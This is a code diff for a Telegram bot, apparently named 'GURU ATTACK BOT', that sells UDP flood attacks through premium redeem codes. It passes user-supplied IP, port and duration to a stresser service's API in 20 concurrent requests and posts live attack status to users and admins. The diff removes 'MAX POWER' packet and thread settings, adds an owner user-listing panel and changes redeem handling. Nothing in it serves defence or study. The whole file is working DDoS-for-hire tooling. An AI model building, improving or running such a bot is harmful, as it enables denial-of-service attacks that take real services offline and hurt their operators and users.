@@ -1,4 +1,4 @@
-# app.py - MAX POWER UDP Attack with Live Time Updates
+# app.py - Fixed Version with User Plan Display and Proper Redeem
 import os
 import logging
 import asyncio
@@ -31,12 +31,6 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 MAX_CONCURRENT = 20
-
-# ===== MAX POWER SETTINGS =====
-MAX_PACKET_SIZE = 65500  # Maximum UDP packet size (65,500 bytes)
-MAX_THREADS = 10000      # Maximum threads for attack
-MAX_PPS = 10000000       # Maximum packets per second (10 million)
-MAX_BPS = 10000000000    # Maximum bits per second (10 Gbps)
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -428,9 +422,6 @@ async def send_attack_alert(attack_info):
             f"⏱️ Duration: {attack_info['duration']}s\n"
             f"📡 Method: {attack_info['method'].upper()}\n"
             f"🔄 Concurrent: {attack_info['concurrent']}\n"
-            f"📦 Packet Size: {MAX_PACKET_SIZE} bytes\n"
-            f"💪 Threads: {MAX_THREADS:,}\n"
-            f"📊 PPS: {MAX_PPS:,}\n"
             f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         
@@ -448,32 +439,24 @@ async def send_attack_alert(attack_info):
     except Exception as e:
         logger.error(f"Alert error: {e}")
 
-# ===== MAX POWER API ATTACK =====
+# ===== API-ONLY UDP ATTACK =====
 async def send_udp_attack(target, port, duration, attack_num):
-    """MAX POWER API-ONLY UDP attack"""
+    """API-ONLY UDP attack - No fallback"""
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # MAX POWER parameters
     params = {
         "key": API_KEY,
         "host": target,
         "port": port,
         "time": duration,
-        "method": "udp",
-        "threads": MAX_THREADS,
-        "pps": MAX_PPS,
-        "bps": MAX_BPS,
-        "size": MAX_PACKET_SIZE,
-        "random": "true",
-        "timeout": 1
+        "method": "udp"
     }
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Encoding": "gzip, deflate",
-        "Connection": "keep-alive",
-        "Cache-Control": "no-cache"
+        "Connection": "keep-alive"
     }
     
     try:
@@ -513,18 +496,15 @@ async def send_udp_attack(target, port, duration, attack_num):
 # ===== 20 CONCURRENT ATTACKS WITH LIVE UPDATES =====
 async def send_20_concurrent_attacks(target, port, duration, update, context, attack_id, user_id):
     """Launch 20 concurrent API attacks with live time updates"""
-    logger.info(f"🚀 Launching 20 concurrent MAX POWER UDP attacks on {target}:{port}")
+    logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
     
     # Create status message for user
     status_msg = await context.bot.send_message(
         chat_id=user_id,
-        text=f"🔥 *MAX POWER ATTACK RUNNING*\n\n"
+        text=f"🔥 *ATTACK RUNNING*\n\n"
              f"🎯 Target: `{target}:{port}`\n"
              f"⏱️ Duration: `{duration}s`\n"
              f"⚡ Attacks: `20 CONCURRENT`\n"
-             f"📦 Packet: `{MAX_PACKET_SIZE} bytes`\n"
-             f"💪 Threads: `{MAX_THREADS:,}`\n"
-             f"📊 PPS: `{MAX_PPS:,}`\n"
              f"⏳ Time Remaining: `{duration}s`\n\n"
              f"🔄 Attack in progress...",
         parse_mode='Markdown'
@@ -536,11 +516,8 @@ async def send_20_concurrent_attacks(target, port, duration, update, context, at
         task = send_udp_attack(target, port, duration, i)
         tasks.append(task)
     
-    # Start the attack timer
-    start_time = time.time()
-    
     # Update timer every 5 seconds
-    timer_task = asyncio.create_task(update_timer(status_msg, user_id, context, duration, target, port, attack_id))
+    timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port))
     
     # Wait for attacks to complete
     results = await asyncio.gather(*tasks)
@@ -556,9 +533,6 @@ async def send_20_concurrent_attacks(target, port, duration, update, context, at
         f"🎯 Target: `{target}:{port}`\n"
         f"⏱️ Duration: `{duration}s`\n"
         f"🎯 Attacks: `{success_count}/20 SUCCESSFUL`\n"
-        f"📦 Packet: `{MAX_PACKET_SIZE} bytes`\n"
-        f"💪 Threads: `{MAX_THREADS:,}`\n"
-        f"📊 PPS: `{MAX_PPS:,}`\n"
         f"⚡ Status: ✅ {'COMPLETED' if success_count > 0 else 'FAILED'}"
     )
     
@@ -574,7 +548,7 @@ async def send_20_concurrent_attacks(target, port, duration, update, context, at
         "duration": duration
     }
 
-async def update_timer(status_msg, user_id, context, duration, target, port, attack_id):
+async def update_timer(status_msg, duration, target, port):
     """Update the timer every 5 seconds"""
     try:
         start_time = time.time()
@@ -592,13 +566,10 @@ async def update_timer(status_msg, user_id, context, duration, target, port, att
                 last_update = int(elapsed)
                 try:
                     await status_msg.edit_text(
-                        f"🔥 *MAX POWER ATTACK RUNNING*\n\n"
+                        f"🔥 *ATTACK RUNNING*\n\n"
                         f"🎯 Target: `{target}:{port}`\n"
                         f"⏱️ Duration: `{duration}s`\n"
                         f"⚡ Attacks: `20 CONCURRENT`\n"
-                        f"📦 Packet: `{MAX_PACKET_SIZE} bytes`\n"
-                        f"💪 Threads: `{MAX_THREADS:,}`\n"
-                        f"📊 PPS: `{MAX_PPS:,}`\n"
                         f"⏳ Time Remaining: `{remaining}s`\n\n"
                         f"🔄 Attack in progress...",
                         parse_mode='Markdown'
@@ -649,14 +620,12 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"📊 Total Attacks: {total_attacks}\n"
         f"📊 Plan: {plan_display}\n"
         f"⚡ 20x UDP Concurrent: ENABLED\n"
-        f"📦 Max Packet: {MAX_PACKET_SIZE} bytes\n"
-        f"💪 Max Threads: {MAX_THREADS:,}\n"
         f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user.id) else '❌ BANNED'}"
     )
     
     keyboard = []
     if not db.is_banned(user.id):
-        keyboard.append([InlineKeyboardButton("💥 MAX POWER ATTACK", callback_data="attack")])
+        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
         keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
     
     if is_admin:
@@ -708,13 +677,10 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     args = context.args
     if len(args) < 3:
         await update.message.reply_text(
-            f"❌ *Usage:* `/attack IP PORT TIME`\n\n"
-            f"Example: `/attack 91.108.17.41 32001 60`\n\n"
-            f"⚡ 20 concurrent MAX POWER attacks!\n"
-            f"📦 Packet Size: {MAX_PACKET_SIZE} bytes\n"
-            f"💪 Threads: {MAX_THREADS:,}\n"
-            f"📊 PPS: {MAX_PPS:,}\n"
-            f"⏱️ Time: 60-300 seconds",
+            "❌ *Usage:* `/attack IP PORT TIME`\n\n"
+            "Example: `/attack 91.108.17.41 32001 60`\n\n"
+            "⚡ 20 concurrent UDP attacks!\n"
+            "⏱️ Time: 60-300 seconds",
             parse_mode='Markdown'
         )
         return
@@ -736,19 +702,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(msg)
             return
         
-        # Initial status
-        initial_msg = await update.message.reply_text(
-            f"🚀 *MAX POWER ATTACK INITIATED*\n\n"
-            f"🎯 Target: `{target}:{port}`\n"
-            f"⏱️ Duration: `{duration}s`\n"
-            f"⚡ Attacks: `20 CONCURRENT`\n"
-            f"📦 Packet: `{MAX_PACKET_SIZE} bytes`\n"
-            f"💪 Threads: `{MAX_THREADS:,}`\n"
-            f"📊 PPS: `{MAX_PPS:,}`\n\n"
-            f"⏳ Starting attacks...",
-            parse_mode='Markdown'
-        )
-        
         attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
         
         # Run attacks with live updates
@@ -763,9 +716,6 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         # Send real-time alert to admins
         await send_attack_alert(attack_info)
-        
-        # Delete initial message
-        await initial_msg.delete()
         
         attack_manager.stop_attack(attack_id)
         attack_manager.cleanup()
@@ -806,14 +756,12 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     await query.edit_message_text(
-        f"💥 *MAX POWER ATTACK*\n\n"
-        f"Send: `IP PORT TIME`\n"
-        f"Example: `91.108.17.41 32001 60`\n\n"
-        f"⚡ 20 concurrent MAX POWER attacks!\n"
-        f"📦 Packet Size: {MAX_PACKET_SIZE} bytes\n"
-        f"💪 Threads: {MAX_THREADS:,}\n"
-        f"⏱️ Time: 60-300 seconds\n"
-        f"Send /cancel to cancel",
+        "💥 *ATTACK*\n\n"
+        "Send: `IP PORT TIME`\n"
+        "Example: `91.108.17.41 32001 60`\n\n"
+        "⚡ 20 concurrent UDP attacks!\n"
+        "⏱️ Time: 60-300 seconds\n"
+        "Send /cancel to cancel",
         parse_mode='Markdown'
     )
     context.user_data['awaiting_attack'] = True
@@ -871,17 +819,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             context.user_data['awaiting_attack'] = False
             return
         
-        initial_msg = await update.message.reply_text(
-            f"🚀 *MAX POWER ATTACK INITIATED*\n\n"
-            f"🎯 Target: `{target}:{port}`\n"
-            f"⏱️ Duration: `{duration}s`\n"
-            f"⚡ Attacks: `20 CONCURRENT`\n"
-            f"📦 Packet: `{MAX_PACKET_SIZE} bytes`\n"
-            f"💪 Threads: `{MAX_THREADS:,}`\n\n"
-            f"⏳ Starting attacks...",
-            parse_mode='Markdown'
-        )
-        
         attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
         
         result = await send_20_concurrent_attacks(target, port, duration, update, context, attack_id, user_id)
@@ -893,8 +830,6 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         
         await send_attack_alert(attack_info)
-        
-        await initial_msg.delete()
         
         attack_manager.stop_attack(attack_id)
         attack_manager.cleanup()
@@ -921,12 +856,12 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Use `/redeem CODE` to get premium access."
         )
     else:
-        days_left = max(0, (expiry - datetime.now()).days) if expiry else 30
+        days_left = max(0, (expiry - datetime.now()).days) if expiry else 0
         text = (
             "👤 *MY PLAN*\n\n"
             "📊 Plan: 💎 PREMIUM\n"
             f"⏱️ Remaining: {days_left} days\n"
-            f"📅 Expires: {expiry.strftime('%Y-%m-%d') if expiry else 'N/A'}\n\n"
+            f"📅 Expires: {expiry.strftime('%Y-%m-%d') if expiry else 'Never'}\n\n"
             "📌 Features:\n"
             "• Full access\n"
             "• 20x UDP Concurrent\n"
@@ -949,6 +884,10 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     plan, expiry = db.get_user_plan(user_id)
     total_attacks = db.get_user_stats(user_id)
     plan_display = "FREE" if plan == "free" else "PREMIUM"
+    
+    if expiry:
+        days_left = max(0, (expiry - datetime.now()).days)
+        plan_display += f" ({days_left}d left)"
     
     await query.edit_message_text(
         f"👤 *USER INFO*\n\n"
@@ -1130,6 +1069,7 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
         [InlineKeyboardButton("📊 STATS", callback_data="stats")],
         [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
+        [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
     
@@ -1137,6 +1077,43 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👑 *OWNER PANEL*\n\nSelect action:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
+    )
+
+async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """List all users with their plan and expiry"""
+    query = update.callback_query
+    await query.answer()
+    
+    users = db.get_all_users()
+    
+    if not users:
+        await query.edit_message_text("📋 No users found.")
+        return
+    
+    text = "👥 *ALL USERS*\n\n"
+    for user in users[:50]:
+        user_id = user.get('user_id')
+        username = user.get('username', 'N/A')
+        plan = user.get('plan', 'free').upper()
+        expiry = user.get('plan_expiry')
+        
+        if expiry:
+            days_left = max(0, (expiry - datetime.now()).days)
+            expiry_text = f"{days_left}d left"
+        else:
+            expiry_text = "No plan"
+        
+        is_banned = "🚫" if user.get('is_banned') else "✅"
+        text += f"{is_banned} `{user_id}` - {username}\n"
+        text += f"   📊 {plan} | ⏱️ {expiry_text}\n\n"
+    
+    if len(users) > 50:
+        text += f"... and {len(users) - 50} more users"
+    
+    await query.edit_message_text(
+        text[:4000],
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
 async def owner_kill_switch_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1358,20 +1335,36 @@ async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     code = args[0].upper()
     
+    # Check if user already used a code
     user = db.get_user(user_id)
     if user and user.get('has_used_code'):
-        await update.message.reply_text("❌ You have already used a redeem code!")
-        return
+        # Check if plan is still active
+        plan, expiry = db.get_user_plan(user_id)
+        if plan == "premium" and expiry and expiry > datetime.now():
+            days_left = (expiry - datetime.now()).days
+            await update.message.reply_text(
+                f"❌ *ALREADY REDEEMED*\n\n"
+                f"You already have an active premium plan!\n"
+                f"⏱️ Remaining: {days_left} days\n"
+                f"📅 Expires: {expiry.strftime('%Y-%m-%d')}\n\n"
+                f"💡 You don't need to redeem again.",
+                parse_mode='Markdown'
+            )
+            return
     
     result = db.use_code(code, user_id)
     
     if result:
+        expiry = datetime.now() + timedelta(days=result['access_days'])
+        days_left = result['access_days']
+        
         await update.message.reply_text(
             f"✅ *CODE REDEEMED!*\n\n"
             f"Code: `{code}`\n"
             f"Duration: {result['access_days']} days\n"
             f"📊 Plan: PREMIUM\n"
-            f"⚡ 20x UDP: ENABLED\n\n"
+            f"⚡ 20x UDP: ENABLED\n"
+            f"⏱️ Expires: {expiry.strftime('%Y-%m-%d')}\n\n"
             f"🎉 You now have premium access!\n"
             f"Use /start to begin attacking!",
             parse_mode='Markdown'
@@ -1392,9 +1385,7 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Active: {stats['active']}\n"
         f"📊 Concurrent: {stats['concurrent_busy']}/{stats['max']}\n"
         f"📈 Total Attacks: {stats['total']}\n"
-        f"🎯 Method: MAX POWER UDP\n"
-        f"📦 Packet: {MAX_PACKET_SIZE} bytes\n"
-        f"💪 Threads: {MAX_THREADS:,}\n"
+        f"🎯 Method: API-ONLY UDP\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
         f"🌐 Status: ONLINE\n\n"
         f"📌 /attack IP PORT TIME",
@@ -1412,7 +1403,7 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     keyboard = []
     if not db.is_banned(user_id):
-        keyboard.append([InlineKeyboardButton("💥 MAX POWER ATTACK", callback_data="attack")])
+        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
         keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
     
     if is_admin:
@@ -1477,6 +1468,7 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
     app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
     app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
+    app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
     app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
     
     # Messages
@@ -1494,12 +1486,10 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("👑 GURU MAX POWER ATTACK BOT")
+    print("👑 GURU ATTACK BOT")
     print("⚡ 20x UDP CONCURRENT")
-    print(f"📦 Max Packet Size: {MAX_PACKET_SIZE} bytes")
-    print(f"💪 Max Threads: {MAX_THREADS:,}")
-    print(f"📊 Max PPS: {MAX_PPS:,}")
     print("💎 PREMIUM ONLY (Redeem Code Required)")
+    print("📌 API-ONLY UDP - NO FALLBACK")
     print("📌 Live Time Updates in Bot DM")
     print("📌 Real-time Alerts to Admins")
     print("=" * 50)
